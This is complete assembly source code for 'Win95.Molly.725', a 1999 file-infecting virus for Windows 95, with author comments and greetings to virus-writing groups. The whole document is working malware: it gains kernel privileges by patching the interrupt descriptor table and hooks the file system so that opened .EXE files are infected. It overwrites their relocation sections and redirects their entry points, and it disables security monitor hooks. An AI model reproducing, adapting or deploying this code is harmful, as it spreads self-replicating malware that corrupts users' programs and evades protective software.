; [Win95.Molly.725] - An experimental specimen
; Copyright (c) 1999 by Billy Belcebu/iKX
;
; [ Introduction ]
;
; This is an  experimental virus. After Win32.Legacy i needed to do something
; small and functional. And here it is. This is my third Ring-0 virus,but the
; code scheme is different this time  from my  two  other R0's (Garaipena and
; PoshKiller). This virus was written just at  the  same time while i started
; to read Neuromancer, and as you can see, its  name comes from the girl with
; specular lens, that is one  of the main  characters of the book (hey, don't
; hesitate and read it!). 
;
; [ Features ]
;
;       + Ring-0 virus by means of modifying the IDT
;       + Resident fast infector of PE files with EXE extension
;       + Infects when system opens file
;       + Overwriting virus (heheh, don't go mad, overwrite relocs) :)
;       + AntiMonitor tunneling (through InstallFileSystemApiHook structure)
;       + Heavy optimization (at least i've tried to), only 725 bytes
;       + My smallest virus so far :)
;
; [ Greetings ]
;
;       + Wintermute &
;         zAxOn         - Thanx for pushing me to read Neuromancer... W0W!
;       + Qozah/29A     - Thanx for your help and support, dude
;       + Benny/29A     - I wanna hear that Czech group ;)
;       + Super/29A     - Why are you always in my greets? :)
;       + StarZer0/iKX  - sexsexsexsexsexsexsexsexsexsexsexsexsexsexsexsexsex
;       + b0z0/iKX      - Padania Libera rules!
;
; (c) 1999 Billy Belcebu/iKX

        .586p
        .model  flat,stdcall

extrn   MessageBoxA:PROC
extrn   ExitProcess:PROC

        .data

szTitle         db      "[Win95.Molly."
                db      virus_size/0100 mod 10 + "0"
                db      virus_size/0010 mod 10 + "0"
                db      virus_size/0001 mod 10 + "0"
                db      "]",0
szMessage       db      "First generation host",10
                db      "(c) 1999 Billy Belcebu/iKX",0

        .code

virus:
        int     3
        jmp     molly1
fakehost:
        call    MessageBoxA,00h,offset szMessage,offset szTitle,1000h
        call    ExitProcess,00h

; ===========================================================================
; Win95.Molly                                                               
; ===========================================================================

molly   segment dword use32 public '.molly'

; --- Virus mode

DEBUG                   equ     FALSE

; --- Some equates

d                       equ     <[ebp]-offset delta>
rd                      equ     <[ebp]-offset r0delta>
rd_                     equ     <[ebx]-offset r0delta>

virus_size              equ     virus_end-virus_start
heap_size               equ     heap_end-virus_end
total_size              equ     virus_size+heap_size

TRUE                    equ     01h
FALSE                   equ     00h

PUSHAD_EDI              equ     00h
PUSHAD_ESI              equ     04h
PUSHAD_EBP              equ     08h
PUSHAD_ESP              equ     0Ch
PUSHAD_EBX              equ     10h
PUSHAD_EDX              equ     14h
PUSHAD_ECX              equ     18h
PUSHAD_EAX              equ     1Ch

PUSHAD_SIZE             equ     20h

; --- VxD Functions

VMM_Get_DDB                     equ     00010146h
IFSMgr_GetHeap                  equ     0040000Dh
IFSMgr_RetHeap                  equ     0040000Eh
IFSMgr_Ring0_FileIO             equ     00400032h
IFSMgr_InstallFileSystemApiHook equ     00400067h

; --- Hooked Functions

IFSFN_FILEATTRIB                equ     21h
IFSFN_OPEN                      equ     24h
IFSFN_RENAME                    equ     25h

; --- IFSMgr_Ring0_FileIO functions used

R0_FILEATTRIBUTES               equ     04300h
R0_OPENCREATFILE                equ     0D500h
R0_CLOSEFILE                    equ     0D700h
R0_READFILE                     equ     0D600h
R0_WRITEFILE                    equ     0D601h

; --- Macro land

dbg     macro   shit2do
IF      DEBUG
        shit2do
ENDIF
        endm

beep    macro
        mov     ax, 1000
        mov     bx, 200
        mov     cx, ax                  
        mov     al, 0B6h
        out     43h, al
        mov     dx, 0012h
        mov     ax, 34DCh
        div     cx
        out     42h, al
        mov     al, ah
        out     42h, al
        in      al, 61h
        mov     ah, al
        or      al, 03h
        out     61h, al
    l1: mov     ecx, 4680d
    l2: loop    l2
        dec     bx
        jnz     l1
        mov     al, ah
        out     61h, al
        endm

VxDCall macro   VxDService
        int     20h
        dd      VxDService
        endm

VxDJmp  macro   VxDService
        int     20h
        dd      VxDService+8000h
        endm

virus_start     label   byte

; --- Virus entrypoint

molly1: jmp     gdelta

; --- Virus data

kernel          dd      00000000h

; --- Virus code 

gdelta: call    delta                           ; Get a relative offset
delta:  pop     ebp

        push    05h                             ; ECX = 5
        pop     ecx                             ; (limit for 'GetImageBase')

        mov     esi,ebp                         ; ESI = Relative offset
        call    GetImageBase                    ; Get host's imagebase
        mov     ModBase d,eax                   ; Store it

        mov     ecx,cs                          ; Avoid installation if we're
        xor     cl,cl                           ; in WinNT
        jecxz   GimmeSomethingBaby

        push    05h                             ; ECX = 5
        pop     ecx                             ; (limit for 'GetImageBase')

        mov     esi,[esp]
        call    GetImageBase
        mov     kernel d,eax

        push    edx
        sidt    fword ptr [esp-2]               ; Interrupt table to stack
        pop     edx

IF      DEBUG
        add     dl,((5*8)+4)
ELSE
        add     dl,((3*8)+4)
ENDIF

        mov     ebx,[edx]
        mov     bx,word ptr [edx-4]

        lea     esi,NewInt3 d

        mov     [edx-4],si
        shr     esi,16                          ; Move MSW to LSW
        mov     [edx+2],si

IF      DEBUG
        int     5
ELSE
        int     3
ENDIF

        mov     [edx-4],bx
        shr     ebx,16
        mov     [edx+2],bx

GimmeSomethingBaby:
        mov     ebx,00400000h                   ; Get at runtime
ModBase equ     $-4
        add     ebx,(fakehost-virus)+00001000h  ; Get at infection time
OldEIP  equ     $-4

        jmp     ebx

NewInt3:
        pushad

        dbg     

        mov     eax,kernel d                    ; EAX = K32 imagebase
        add     al,38h                          ; Ptr to an unused field

        cmp     word ptr [eax],0CA5Eh           ; Already installed?
        jz      already_installed               ; If so, exit

        mov     word ptr [eax],0CA5Eh           ; Case is here...

        fild    real8 ptr [ebp+(@@1-delta)]     ; Do u know any other way for
                                                ; manipulate more than 4 bytes?
                                                ; (without MMX, dork ;)
        push    total_size
@@1:    VxDCall IFSMgr_GetHeap
        xchg    eax,ecx
        pop     eax

        fistp   real8 ptr [ebp+(@@1-delta)]

        jecxz   already_installed

        xchg    eax,ecx
        mov     edi,eax
        lea     esi,virus_start d
        rep     movsb

        lea     edi,[eax+(FileSystemHook-virus_start)]
        xchg    edi,eax
        push    eax
@@2:    VxDCall IFSMgr_InstallFileSystemApiHook
        pop     ebx

        xchg    esi,eax
        push    esi
        add     esi,04h
tunnel: lodsd
        xchg    eax,esi
        add     esi,08h
        js      tunnel

        mov     dword ptr [edi+(top_chain-virus_start)],eax
        pop     eax
        mov     dword ptr [edi+(OldFSA-virus_start)],eax

        and     byte ptr [edi+(semaphore-virus_start)],00h

already_installed:
        popad
        iret

; --- The new FileSystem hook ;)

FileSystemHook  proc c, FSD_Func_Address:DWORD, Function:DWORD, Drive:DWORD,\
                        ResourceKind:DWORD, StrCodePage:DWORD, PtrIOREQ:DWORD

        cmp     Function,IFSFN_OPEN             ; File Open? Infect if it is
        jz      infect

ExitFileSystemHook:
        mov     eax,12345678h
        org     $-4
OldFSA  dd      00000000h
        call    [eax] c, FSD_Func_Address, Function, Drive, ResourceKind, \
                         StrCodePage, PtrIOREQ
        ret
FileSystemHook  endp

r0fio:          VxDJmp  IFSMgr_Ring0_FileIO
R0_FileIO:      VxDJmp  IFSMgr_Ring0_FileIO
                dw      0000h

pe_header_ptr   dd      00000000h
top_chain       dd      00000000h
semaphore       db      00h

infect:
        pushfd
        pushad

        call    r0delta
r0delta:pop     ebx

        cmp     byte ptr [ebx+(semaphore-r0delta)],00h
        jnz     exit_infect

        inc     byte ptr [ebx+(semaphore-r0delta)]

        lea     esi,top_chain rd_               ; Make null top chain, so we
        lodsd                                   ; avoid monitors by means of
        xor     edx,edx                         ; cutting their balls :)
        xchg    [eax],edx

        pushad

        lea     edi,filename rd_
        push    edi

        mov     esi,PtrIOREQ                    ; ESI = Ptr to IOREQ struc
        mov     esi,[esi.2Ch]                   ; ESI = Ptr to UNI filename
uni2asciiz:
        movsb                                   ; Convert to ASCIIz
        dec     edi
        cmpsb
        jnz     uni2asciiz

        pop     edx                             ; EDI = Ptr to ASCIIz filename

        cmp     dword ptr [edi-05h],"EXE."      ; Infect only EXE files
        jnz     AvoidInfection

IF      DEBUG
        cmp     dword ptr [edi-0Ch],"TAOG"
        jnz     AvoidInfection
ENDIF

        mov     esi,edx                         ; ESI = Ptr to filename
        xor     eax,eax
        mov     ah,R0_FILEATTRIBUTES/100h       ; EAX = Function
                                                ;           GETFILEATTRIBUTES
        push    eax
        call    R0_FileIO
        pop     eax
        jc      AvoidInfection

        inc     eax                             ; EAX = Function
                                                ;           SETFILEATTRIBUTES
        push    esi
        push    ecx
        push    eax
        xor     ecx,ecx                         ; ECX = New attributes
        call    R0_FileIO
        jc      RestoreAttributes

        xor     eax,eax
        cdq
        mov     ah,R0_OPENCREATFILE/100h        ; EAX = Function OPENFILE
        mov     ecx,edx                         ; ECX = 0
        inc     edx                             ; EDX = 1
        mov     ebp,edx
        inc     ebp
        xchg    ebp,ebx                         ; EBX = 2
        call    R0_FileIO
        jc      RestoreAttributes
        xchg    eax,ebx                         ; EBX = File handle

        xor     eax,eax
        mov     ah,R0_READFILE/100h             ; EAX = Function READFILE
        push    eax
        push    04h
        pop     ecx                             ; ECX = Bytes to read (4)
        push    3Ch
        pop     edx                             ; EDX = Where to read (3C)
        lea     esi,pe_header_ptr rd            ; ESI = Where store data
        call    R0_FileIO

        lodsd
        xchg    eax,edx                         ; EDX = Where to read
        pop     eax                             ; EAX = Function READFILE
        lea     esi,pe_header rd                ; ESI = Where store data
        xor     ecx,ecx
        mov     ch,04h                          ; ECX = Bytes to read (1K)
        call    R0_FileIO

        cmp     word ptr [esi],"EP"
        jnz     CloseFile

        mov     al,"M"-"O"+"L"-"L"+"Y"          ; Mark in the PE header
        cmp     byte ptr [esi+1Ah],al
        jz      CloseFile
        mov     byte ptr [esi+1Ah],al

        mov     edi,esi
        movzx   eax,word ptr [edi+06h]          ; Get last section of header
        dec     eax
        imul    eax,eax,28h
        add     esi,eax
        add     esi,78h
        mov     edx,[edi+74h]
        shl     edx,03h
        add     esi,edx                         ; ESI = last section header
                                                ; EDI = PE header

        mov     [esi+24h],0E0000000h            ; New sectionz attributes

        and     dword ptr [edi+0A0h],00h        ; Nulify possible .reloc
        and     dword ptr [edi+0A4h],00h

        cmp     dword ptr [esi],"ler."
        jnz     CloseFile
        cmp     word ptr [esi+04h],"co"
        jnz     CloseFile

; Oh, wtf, OVERWRITE! ;)

        mov     dword ptr [esi],"lom."          ; .reloc -> .molly
        mov     word ptr [esi+4],"yl"

        and     dword ptr [esi+18h],00h         ; Clear PointerToRelocations
        and     word ptr [esi+20h],00h          ; Clear NumberOfRelocations

        push    dword ptr [esi+14h]             ; Where copy virus

        mov     eax,virus_size
        mov     [esi+08h],eax                   ; VirtualSize -> virus size
        mov     ecx,[edi+3Ch]

        cdq                                     ; Align, sucker
        push    eax
        div     ecx
        pop     eax
        sub     ecx,edx
        add     eax,ecx

        mov     [esi+10h],eax                   ; SizeOfRawData -> aligned
                                                ;                  virus size

        mov     eax,[esi+0Ch]                   ; New EIP
        xchg    eax,[edi+28h]                   ; Put new EIP and get old one
        mov     OldEIP rd,eax                   ; Save it

        push    eax

        xor     eax,eax
        mov     ah,R0_WRITEFILE/100h            ; Write the modified header
        inc     eax
        push    eax
        xor     ecx,ecx
        mov     ch,04h
        mov     edx,pe_header_ptr rd
        lea     esi,pe_header rd
        call    R0_FileIO

        fild    real8 ptr [ebp+(r0fio-r0delta)] ; Fix R0_FileIO VxDJmp...
        fistp   real8 ptr [ebp+(R0_FileIO-r0delta)]

        pop     eax                             ; Write virus
        pop     ecx
        pop     edx
        lea     esi,virus_start rd
        call    R0_FileIO

CloseFile:
        xor     eax,eax
        mov     ah,R0_CLOSEFILE/100h
        call    R0_FileIO

RestoreAttributes:
        pop     eax
        pop     ecx
        pop     esi
        call    R0_FileIO

AvoidInfection:
        popad

        mov     [eax],edx                       ; Restore top chain

        dec     byte ptr [ebx+(semaphore-r0delta)]

exit_infect:
        popad
        popfd
        jmp     ExitFileSystemHook

; input:
;       ESI - Any position in the page where we want to search
;       ECX - Search limit (number of pages(limit)/10)
; output:
;       EAX - Base address of module/process

GetImageBase:
        pushad
	and     esi,0FFFF0000h
_@1:    cmp     word ptr [esi],"ZM"
	jz      CheckPE
_@2:    sub     esi,00010000h
	loop    _@1
	jmp     WeFailed
CheckPE:
        mov     edi,[esi.3Ch]
	add     edi,esi
        cmp     word ptr [edi],"EP"
	jnz     _@2
	mov     [esp.PUSHAD_EAX],esi
WeFailed:
	popad
	ret

; --- Some shit

        db      00h,"[Win95.Molly] (c) 1999 Billy Belcebu/iKX",00h

; --- Virus heap data

virus_end               label   byte
filename                db      100h dup (00h)
pe_header               db      400h dup (00h)

heap_end                label   byte

molly   ends

        end     virus





